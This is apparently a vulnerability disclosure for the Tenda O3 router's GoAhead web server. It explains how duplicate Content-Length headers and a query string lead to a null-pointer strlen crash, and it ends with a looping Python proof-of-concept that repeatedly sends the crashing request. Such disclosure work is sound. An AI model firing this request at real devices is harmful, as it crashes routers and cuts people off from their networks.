# Vulnerability details
## 1. Vulnerability Trigger Location
The following vulnerability analysis and explanation are based on the `Tenda O3` router, with firmware version `V1.0.0.5(4180)`. The vulnerability trigger and analysis methods for other models are similar.

The vulnerability trigger location is at the `strlen` function call under the `websReadEvent` function, at address `0x0042f3a0`. For easier analysis, I referred to the GoAhead 2.5 source code from https://github.com/ehlalwayoUk/goahead/tree/master and modified the variable names in Ghidra accordingly.

## 2. Conditions to Satisfy
- In the websUrlParse function, the `?` in POST /goform/GetIPTV?fgHPOST/goform/SysToo allows `strchr` at `0x4224fc` to get the index of the ?. Referring to the GoAhead source code, it can be seen that the information after `?` is stored in `wp->query`. ![websUrlParse](./assets/websUrlParse.png) ![websUrlParse](./assets/websurlparse_source.png.png) 

- **Content-Length** must be written twice.
    - The first `Content-Length` should be `>= 1`. This is necessary to set `param_1 + 0xec(wp->flags) |= 0x400` and call `websSetVar`  to set `CONTENT_LENGTH` value..
    ![else_content_length](./assets/else_content_length.png)
    - The second `Content-Length` is to set `clen = 0`. It set `param_1 + 0xf4 = 0`.
- After that, an empty line (`\r\n`) is needed to ensure the final `text` is empty.In the `socketGets` function, reading an isolated \r\n sets `nbytes = 0`, and as a result, `*text = 0`. The corresponding assembly location is at `0x418e08`.![socketGets](./assets/socketGets.png)

- Due to conditions such as nbytes = 0 being met, wp->state = 8 is finally set in the websGetInput function at address `0x43009c`.![wp_state_8](./assets/wp_state_8.png)

- At address `0x42f480` in the websReadEvent function, the value of `iVar2` is obtained as `wp->state`, which is 8.![getstate](./assets/getstate.png)

- As a result, in the `websReadEvent` function, because `iVar2 = 8` and there is content in `wp->query`, both the `if` and `else if` conditions are not satisfied, leading to the else branch being executed, which triggers the vulnerability.`strlen` is called with a null pointer, which leads to a segmentation fault when dereferenced internally.![ivar2_8](./assets/ivar2_8.png)


# POC

```python
import socket

host = "192.168.1.100"
port = 80
times = 0
while 1:
    times += 1
    print("times:"+str(times))
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    request = (
        "POST /goform/GetIPTV?fgHPOST/goform/SysToo HTTP/1.1\r\n"
        "Content-Length:1\r\n"
        "Content-Length:# \r\n"
        "\r\n"
    )
    s.send(request.encode())
    response = s.recv(4096)
    print(response.decode())
    s.close()
```
